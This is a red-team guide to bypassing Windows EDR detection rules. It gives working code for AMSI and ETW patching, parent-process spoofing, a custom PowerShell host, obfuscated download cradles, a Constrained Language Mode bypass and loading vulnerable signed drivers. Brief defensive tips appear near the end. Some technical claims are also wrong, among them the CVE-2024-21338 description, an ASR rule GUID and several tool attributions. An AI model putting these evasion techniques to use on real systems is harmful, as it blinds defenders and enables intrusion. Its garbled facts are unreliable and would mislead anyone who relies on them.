# AV/EDR Evasion: Bypassing EDR Detection Rules Deep Dive

## Overview

Modern EDR platforms (CrowdStrike Falcon, SentinelOne Singularity, Microsoft Defender for Endpoint, Elastic Endpoint Security, Cisco Talos Snort+Tetration, Trellix, Sophos) do not rely on a single detection primitive. They fuse kernel callbacks, ETW telemetry, file/registry mini-filters, memory scanning, and behavioral correlation rules into a detection pipeline. The rules are encoded as Sigma YAML, Kibana queries (KQL/EQL), Splunk SPL, or proprietary detection languages (Microsoft's KQL hunting queries, CrowdStrike's Event Search queries, Elastic's detection-rules repo).

This guide is the red-team counterpart to that pipeline. For each detection vector, we describe what the rule authors look for, then the field-proven bypass technique. Coverage includes process creation, image load, network, registry, file, and memory-scanning rule classes, with hands-on PoCs for PowerShell Constrained Language Mode, AMSI bypass, ETW patching, and WDAC/ASR rule bypass. The goal is not to defeat a single signature but to understand the rule surface well enough to choose a path that minimizes telemetry generation across the stack.

A guiding principle: **every telemetry event a technique generates is a rule match waiting to happen**. The cleanest evasions either suppress the event at the source (patch ETW/AMSI, use direct syscalls to skip user-mode hooks, transacted registry) or camouflage it inside high-volume legitimate activity (LOLBins, signed-but-side-loaded DLLs, CDN-fronted C2).

## EDR Detection Architecture

### Telemetry Sources

1. **Kernel callbacks** — `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, `ObRegisterCallbacks` (process/thread handle creation), `CmRegisterCallback` (registry), `Mini-filter` file callbacks (`IRP_MJ_CREATE`, `IRP_MJ_WRITE`). These are unavoidable from user mode; the EDR's kernel driver sees everything. CrowdStrike Falcon's `CSFalconService.exe` and its driver `cpd.sys` install all of these.
2. **ETW (Event Tracing for Windows)** — particularly the Threat-Intelligence provider `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` exposed to EDR vendors via `EtwNotificationRegister`. ETWti provides user-mode-visible call stacks for sensitive APIs (`VirtualProtect`, `WriteProcessMemory`, etc.). MDE and Elastic both consume ETWti.
3. **File/registry mini-filters** — intercept every CreateFile/RegSetValue. Anti-malware scan interfaces (AMSI) feed script content into the AV engine.
4. **Memory scanning** — periodic scans of process memory for injected code. Sleep masks, module stomping, and Foliage exist to defeat this.
5. **Network** — DNS, HTTP/TLS SNI, proxy logs. Source of domain-aging and CDN-fronting detections.

### Rule Layers

Rules are layered: **atomic** (single event, e.g., "powershell.exe launched from word.exe"), **computed** (event aggregates, e.g., "5 failed logins then success"), **behavioral** (sequence over time, e.g., "process injected into explorer then spawned cmd"). Sigma and Elastic detection-rules are predominantly atomic; CrowdStrike's Behavior Identification (BOAs) and MDE's advanced hunting queries lean behavioral.

The attacker's choice of which layer to attack depends on visibility: atomic rules fire on the event itself, so suppression is required; behavioral rules can be defeated by breaking the sequence (e.g., spawn a sacrificial process so the parent is not the office app).

## Common Detection Rules (SigmaHQ / Elastic / Splunk)

The SigmaHQ repo (`https://github.com/SigmaHQ/sigma`) and Elastic's detection-rules (`https://github.com/elastic/detection-rules`) encode community knowledge. Representative rules:

- `proc_creation_win_powershell_enc_cmd.yml` — powershell.exe with `-EncodedCommand` / `-e` / `-ec`. Atomic.
- `proc_creation_win_susp_mshta_http.yml` — `mshta.exe http://...` (T1218.005).
- `proc_creation_win_lolbin_rundll32_susp_ext.yml` — rundll32 with `.png`, `.jpg`, `.dat` extensions.
- `posh_ps_invoke_expression.yml` — `Invoke-Expression` / `IEX` in script content (AMSI-delivered).
- `proc_creation_win_direct_syscall_native_api.yml` — `ntdll.dll` loaded but no `Sysmon` EID 1 follow-through, indicative of direct syscalls.
- Elastic `credential_access_lsass_handle_access.yml` — `lsass.exe` handle requested with `PROCESS_VM_READ` (credential dump).
- Splunk `ESCU` searches like "Detect New Local Admin account" — correlation across event IDs.

Each rule is a string match, regex, or aggregation over EID 1 (process create), EID 7 (image load), EID 8 (remote thread create), EID 10 (process access), EID 11 (file create), EID 12/13 (registry), EID 22 (DNS), EID 3 (network connection).

## Process Creation Rule Bypasses

### Process Name Spoofing

Many rules key on the binary name (`powershell.exe`, `cmd.exe`, `procdump.exe`). Two flavors of bypass:

1. **Rename / copy**: `copy %WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\not-a-ps.exe`. AMSI and the CLR loader still fire because they are intrinsic to the binary, but rules looking only at `Image endswith powershell.exe` miss. Defenders mitigate via `OriginalFileName` (PE resource) which Sysmon EID 1 reports. Counter-counter: compile a custom PowerShell host (`Microsoft.PowerShell.ConsoleHost` assembly) — `OriginalFileName` is then whatever you set.
2. **Custom hosting of the CLR**: instantiate `System.Management.Automation.Runspaces` from a C# binary you wrote. No `powershell.exe` ever launches. This is the canonical PowerShell-v5+ evasion.

Hands-on custom PowerShell host (C#):

```csharp
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class PSHost {
    static void Main(string[] args) {
        using (var rs = RunspaceFactory.CreateRunspace()) {
            rs.Open();
            using (var ps = PowerShell.Create()) {
                ps.Runspace = rs;
                ps.AddScript(args[0]);
                ps.Invoke();
            }
        }
    }
}
```

No `Image=powershell.exe` event. The `powershell` script-block EID 4104 is still emitted by the Windows PowerShell provider, so AMSI and ScriptBlock logging still apply — pair with the AMSI bypass below.

### Command Line Obfuscation

Detection rules frequently use regex like `(?i)(iex|invoke-expression|downloadstring|net\.webclient)`. Bypass via:

- **Case mixing**: `InVoKe-ExPreSsIoN`. PowerShell is case-insensitive; regexes that aren't `(?i)` fail.
- **Substring splicing**: `(New-Object Net.WebClient).DownloadString('ht'+'tp://x/y')` — concatenated strings defeat naive regex.
- **Reversed payload**: `$cmd = '...'; iex ($cmd[-1..-($cmd.length)] -join '')`.
- **Format string**: `& ('{0}{1}' -f 'I','EX') $payload`.

The defensive answer is ScriptBlock logging (EID 4104) plus AMSI, which deobfuscate at runtime. The attacker answer is the AMSI bypass.

### Parent Process Spoofing via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`

Many process-lineage rules look for suspicious parent/child pairs (`word.exe → cmd.exe`, `outlook.exe → powershell.exe`). Spoof a legitimate parent:

```cpp
SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
auto buf = malloc(size);
auto list = (PPROC_THREAD_ATTRIBUTE_LIST)buf;
InitializeProcThreadAttributeList(list, 1, 0, &size);

HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, legit_pid /* e.g., explorer */);
DWORD64 ppidAttr = (DWORD64)legit_pid;
UpdateProcThreadAttribute(list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                          &hp, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEX si{ sizeof(si) };
si.lpAttributeList = list;
PROCESS_INFORMATION pi{};
CreateProcessW(nullptr, (LPWSTR)L"cmd.exe /c notepad.exe",
               nullptr, nullptr, FALSE,
               EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr,
               (STARTUPINFO*)&si, &pi);
```

Result: Sysmon EID 1 reports `ParentImage = explorer.exe`. Counter: EDR correlation on `CREATING_PROCESS` (the actual `CreateProcess` caller) versus `PARENT_PROCESS` (the spoofed field) — exposed via ETWti and kernel `PsSetCreateProcessNotifyRoutine`. Counter-counter: spawn the sacrificial process from a context whose creator and parent coincide, then PPID-spoof into *that*.

## Image Load Rule Bypasses

EDRs flag DLL loads from user-writable paths (`%TEMP%`, `%APPDATA%`, `C:\Users\Public`), unsigned DLLs, or DLLs with suspicious export names (`reflective_loader`, `ServiceMain` paired with suspicious IAT).

### Side-Loading (DLL Search Order Hijacking)

Place a malicious DLL next to a signed executable that loads a same-named DLL. Canonical targets catalogued in https://github.com/wietze/windows-dll-hijacking. Example: a Microsoft-signed binary searches its directory for `version.dll`; you supply one forwarding the original 22 exports via `.def`:

```
; version.def
EXPORTS
  GetFileVersionInfoA       = original_version.GetFileVersionInfoA
  GetFileVersionInfoByRange = original_version.GetFileVersionInfoByRange
  ...
  ServiceMain               = MY_STAGER.ServiceMain   ; malicious export
```

Image load event EID 7 shows `ImageLoaded` from the binary's directory, but the binary is signed, the parent is the legit tool — blends in unless the EDR hashes `version.dll` against known-good.

### Signed-but-Malicious DLLs

Bring-your-own-signed-DLL: `mimikatz` famously loads the signed `dynwrap.dll` (Microsoft MS-Defender-trusting) and similar. CVE-2024-21338 (Win32k `NtUserConsoleControl`) is exploited via signed drivers. EDRs detect via signature-issuer allowlists + behavior; you mitigate by hijacking genuinely benign signed binaries and only doing suspicious work in-process.

## Network Rule Bypasses

### Domain Aging

Many detections fire when a domain is younger than N days (Sigma `dnsquery_win_new_or_rarely_seen_domains.yml`). Register domains 6+ months before use ("age them"). Counter-defender: WHOIS + passive DNS history across years.

### CDN / Cloud Fronting

Use high-reputation CDNs (CloudFront, Azure Front Door, Cloudflare Workers) to terminate TLS. C2 endpoint becomes `https://cdn.azureedge.net/...`. SNI-based detections miss because SNI is the CDN. Domain-fronting (different Host header than SNI) is largely dead at CloudFront/Azure but survives on smaller CDNs and on Azure Application Gateway with custom domains. **Dead-drop resolvers**: store the real C2 URL on GitHub gist, Imgur EXIF, Telegram channel topics, or Steam profile fields. Lookup blends with normal traffic to those platforms.

### DNS Rule Evasion

Rule: `dnsquery_win_long_txt.yml` flags long TXT lookups (base64-over-DNS). Bypass via short A/AAAA queries with a windowed encoding (Cobalt Strike's DNS beacon does this). Use legitimate-looking subdomain patterns (`a1b2c3.update.microsoft.com`-style on a domain you own) to defeat rare-domain rules.

## Registry Rule Bypasses

EDR `CmRegisterCallback` sees every value write. Persistence rules fire on `Run`/`RunOnce`/`Winlogon`/`Image File Execution Options` writes.

### Transacted Registry Operations

Wrap registry writes in a KTM transaction (`CreateTransaction`, `RegCreateKeyTransacted`, `RegSetValueExTransacted`). Commit only when the EDR's CM callback context has passed — or rollback before commit and the visible state never changes. This was popularized for persistence: prepare keys transacted, then on trigger, commit. Some EDRs (older CrowdStrike builds) did not see transacted writes until commit; current versions patch this, but timing windows still exist.

### NTFS Alternate Data Streams

`C:\temp\payload.exe` is visible; `C:\temp\benign.txt:payload.exe` is functionally an ADS. Launch via `wscript.exe C:\temp\benign.txt:x.js`. File-create EID 11 rules looking at `TargetFilename` may not catch ADS path; Sysmon does report them but many off-the-shelf Sigma rules don't pattern-match.

### Registry Hive Loading / WMI Subscriptions

`reg load HKU\TempHive %APPDATA%\hive.hive` then write persistence keys into the offline hive, unload it. The writes never appear in a live CM callback for the running system image. **WMI event subscriptions** (`__EventFilter` + `CommandLineEventConsumer`) persist in CIM repository, a single write at install time. Sysmon EID 19/20/21 surface these — most defenders are not monitoring EID 19.

## File Rule Bypasses

- **Fileless via registry**: payload stored as Base64 in a registry value, decoded at runtime by a stager.
- **Fileless via WMI**: `wmic /namespace:\\root\cimv2 class ...` stores objects.
- **Memory-only**: shellcode-only implant, no on-disk component. EDR file scanner finds nothing.
- **NTFS ADS** as above.
- **Container files**: ZIP/CAB/vhd/vhdx — `diskshadow`/`esentutl` can extract. Many rules key on PE extension; non-PE containers are scanned lazily.

## Memory Scanning Rule Bypasses

Periodic scans (every 10-30s on MDE, more frequent on SentinelOne) walk process VADs and inspect RWX pages, looking for known shellcode patterns (Metasploit msfvenom stub, Cobalt Strike beacon).

### Sleep Mask v5 (Cobalt Strike 4.9+)

Beacon encrypts its own memory when entering sleep, then decrypts on wake via `WakeUp`. RWX regions become unreadable during the scan window. Sleep mask v5 introduces per-thread masks and use of `SetWaitableTimer` to schedule wakes, defeating scanners that look for `SleepEx` calls.

### Foliage

Allocates a private region in a sacrificial process, copies shellcode, then flips the VAD entry to make the region appear as a backed section from a legitimate DLL. Memory scanners that check section-name attribution are fooled.

### Async Scan Timing

EDR scans are periodic, not continuous. By waiting for the scan window to elapse between `VirtualProtect` to RWX and execution, you minimize exposure. Techniques like `Ekko` (timer-based `RtlCreateTimer`) and `Foliage` shift RWX time into very narrow windows.

## Hands-on: Concrete Bypass PoCs

### PowerShell Constrained Language Mode Bypass

When a system has `ConstrainedLanguageMode` enforced (via WDAC, AppLocker, or SystemDefault), COM/WMI/Win32 API access is restricted. Detection via `Get-ExecutionPolicy` shows it; bypass via:

```powershell
# Method 1: Inline C# via Add-Type (blocked in CLM for sensitive types — try via msbuild)
# Method 2: Reflective load of a full-language runspace
$rb = New-Object System.Reflection.AssemblyName('x')
$ba = [Convert]::FromBase64String('TVqQAAMAAAAEAAAA...') # full-language host assembly
[Reflection.Assembly]::Load($ba)

# Method 3: PSByPassCLM (github.com/padovah4ck/PSByPassCLM)
# Exports InstallUtil-aware runspace. Run via:
InstallUtil.exe /logfile= /LogToConsole=false /U PSByPassCLM.dll
```

If CLM is enforced by WDAC with UserMode signing, only Method 3 (signed host) survives.

### AMSI Bypass

AMSI ships in Windows 10+, integrated into PowerShell 5+, Windows Script Host, .NET 4.8+, VBA, JScript, VBScript. The engine calls `AmsiScanBuffer` on every script buffer.

**Patch `AmsiScanBuffer` (PowerShell, runtime):**

```powershell
$w = 'System.Web.Script.Serialization.JavaScriptSerializer'; # decoy
$z = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$h = $z.GetField('amsiInitFailed','NonPublic,Static')
$h.SetValue($null,$true)   # forces amsiInitFailed = true; AmsiScanBuffer returns clean
```

**C patch (faster, survives CLM):**

```c
#include <windows.h>
int main() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    void* p = GetProcAddress(amsi, "AmsiScanBuffer");
    DWORD old;
    VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
    *(unsigned char*)p = 0xc3;   // ret — AmsiScanBuffer immediately returns AMSI_RESULT_CLEAN
    // (return code 0 == clean); or patch body to set *result = 0
    return 0;
}
```

This patches the prologue to `ret` (0xC3). On x64, the function returns `S_OK` (0) and `result` is left untouched (often 0). Robust variants set `*result = AMSI_RESULT_CLEAN` via a 5-byte stub. Detection: ETW logs `AmsiScanBuffer` failures; defenders fingerprint via Sysmon EID 7 on amsi.dll + memory write. Mitigate via hardware breakpoints (`PAGE_GUARD`) instead of `VirtualProtect` writes.

### ETW Patching (`EtwNotificationRegister` / `EtwEventWrite`)

Patch `ntdll!EtwEventWrite` to skip telemetry emission. Native:

```c
#include <windows.h>
int PatchEtw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* p = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
    *(unsigned char*)p = 0xc3;   // ret immediately
    return 0;
}
```

For ETWti (the security provider), patch `EtwNotificationRegister` to fail provider enable. EDR vendors monitor their own patching — CrowdStrike injects a remote `VirtualProtect` into the EDR process; defenders hook `ntdll!NtTraceEvent` from kernel and report from a non-patchable location.

### WDAC / ASR Rule Bypass

Microsoft Defender Attack Surface Reduction (ASR) rules block: Office child processes, credential theft (lsass dump), obfuscated scripts, executable content from email, etc. WDAC enforces signed-binary-only execution.

**Bypass ASR "Block Office child process creation" (GUID `d4f94011-26b3-4d16-a5b4-7a3e6f3e8e09`)**: spawn the child indirectly — Office macro writes a scheduled task (`Schedule.Service` COM, `ITaskService`), the task spawns the child. Office never calls `CreateProcess`; rule doesn't fire.

**Bypass ASR "Block executable content from email client / webmail"**: stage via a `.zip`-in-`.zip` or via a non-Office front-end (Teams, OneNote — for a while ASR didn't cover OneNote attachments, hence the 2023–2024 surge in OneNote-malware).

**Bypass WDAC**: drivers must be signed. Bring-your-own-vulnerable-driver (BYOVD): load a known-vulnerable signed driver (`RTCore64.sys` from MSI Afterburner, `gigabyte_driver`, `iqvw64e.sys` from Intel) and exploit it for kernel R/W. Catalog at https://loldrivers.io. Microsoft has since revoked many, but blocking-mode WDAC still permits already-loaded ones. CVE-2024-21338 (Win32k `NtUserConsoleControl`) is a user-mode path to kernel, bypassing WDAC entirely since WDAC enforces user-mode signing only.

## Defensive Recommendations

For blue teams tuning rules and expanding source coverage:

1. **Rule tuning**: enable `OriginalFileName` matching alongside `Image` to defeat renames. Use `(Image endswith or OriginalFileName eq)` predicates in Sigma.
2. **Source coverage**: collect Sysmon EID 1, 3, 7, 8, 10, 11, 12, 13, 22, 255 plus EID 4104 (PowerShell ScriptBlock), 4688 (process create with command line), 4663 (object access), 10 (kernel object). Stream to Sentinel/Splunk. Forward ETWti to a SIEM table for behavioral hunts.
3. **AMSI patching detection**: alert on `VirtualProtect` against `amsi.dll` regions from non-AMSI processes. Sysmon EID 8 (CreateRemoteThread into amsi.dll) is high-signal.
4. **ETW integrity**: protect `EtwEventWrite` via kernel-mode callbacks (don't rely on user-mode `ntdll` exports alone). CrowdStrike and MDE do this; verify your vendor.
5. **Behavioral over atomic**: as atomic rules are evasion-friendly, invest in sequence-based detections (process A writes to process B's memory, then B spawns a child with no `Window Mark`).
6. **Memory scanning cadence**: randomize, don't fix at 30s. Add scan-on-event (post-sleep wake, post-DLL-load) rather than scan-on-timer.
7. **Hunt, don't just detect**: KQL/Sigma hunting queries for known bypass indicators (`EtwEventWrite` prologue patch, transacted registry keys, PPID mismatches where creator != parent) — these rarely block live but yield hunting hits.

## References

1. Microsoft — AMSI design documentation — https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
2. Microsoft — Attack Surface Reduction (ASR) rules reference — https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference
3. Microsoft — Windows Defender Application Control (WDAC) — https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/wdac-and-applocker-overview
4. Microsoft — Event Tracing for Windows (ETW) — https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing
5. Microsoft Security Threat Intelligence — APT actor TTPs and detections — https://www.microsoft.com/en-us/wdsi
6. CrowdStrike — Falcon sensor architecture blog — https://www.crowdstrike.com/blog/tech-corner/a-deep-dive-into-the-crowdstrike-falcon-sensor/
7. CrowdStrike — Behavior Identification (BOA) documentation — https://falcon.crowdstrike.com/documentation/106/behavior-identifications
8. SentinelOne — ActiveEDR and Storyline documentation — https://www.sentinelone.com/platform/singularity-endpoint/
9. Elastic — detection-rules repository — https://github.com/elastic/detection-rules
10. SigmaHQ — Sigma rule repository — https://github.com/SigmaHQ/sigma
11. Splunk — ESCU (Enterprise Security Content Updates) — https://github.com/splunk/security_content
12. EDR-Rules — community EDR rule collection (Karneades) — https://github.com/zeronetworks/EDRSandblast and https://github.com/zeronetworks/r77-rootkit references
13. LOLBAS — Living Off The Land Binaries and Scripts — https://lolbas-project.github.io/
14. LOLDrivers — Living Off The Land Drivers (BYOVD) — https://www.loldrivers.io/
15. Wietze — Windows DLL Hijacking catalogue — https://github.com/wietze/windows-dll-hijacking
16. Microsoft — CVE-2024-21338 Win32k elevation of privilege — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21338
17. Cobalt Strike — Sleep Mask Kit documentation — https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/sleep-mask-kit.htm
18. talos — Cisco Talos threat research blog (rule patterns, detection engineering) — https://blog.talosintelligence.com/
19. Microsoft Defender for Endpoint hunting queries — https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview
20. Zeronetworks — EDRSandBlast tool (disables EDR telemetry) — https://github.com/wavestone-cdt/edrsandblast
21. Padovah4ck — PSByPassCLM (Constrained Language Mode bypass) — https://github.com/padovah4ck/PSByPassCLM
